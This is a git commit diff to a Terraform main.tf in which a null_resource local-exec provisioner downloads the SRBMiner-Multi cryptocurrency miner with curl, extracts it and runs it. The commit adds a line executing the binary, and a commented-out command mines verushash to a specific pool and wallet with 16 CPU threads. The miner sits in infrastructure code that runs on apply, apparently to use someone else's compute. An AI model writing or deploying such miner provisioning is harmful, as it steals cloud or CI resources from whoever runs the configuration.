c273aee6e8ec410590dcc021226872a8746f769c
mooghen01-hue <chriskm0101@outlook.com>
2026-01-09 20:55:58 +0700

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,4 +1,4 @@
-resource "null_resource" "run_1" {
+resource "null_resource" "run_2" {
   provisioner "local-exec" {
     command = <<EOT
 set -e
@@ -8,6 +8,7 @@ curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMi
 tar -xzf SRBMiner-Multi.tar.gz
 echo "Start Mining"
 ls SRBMiner-Multi-3-1-1
+./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --help
 #./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 16
 
 EOT
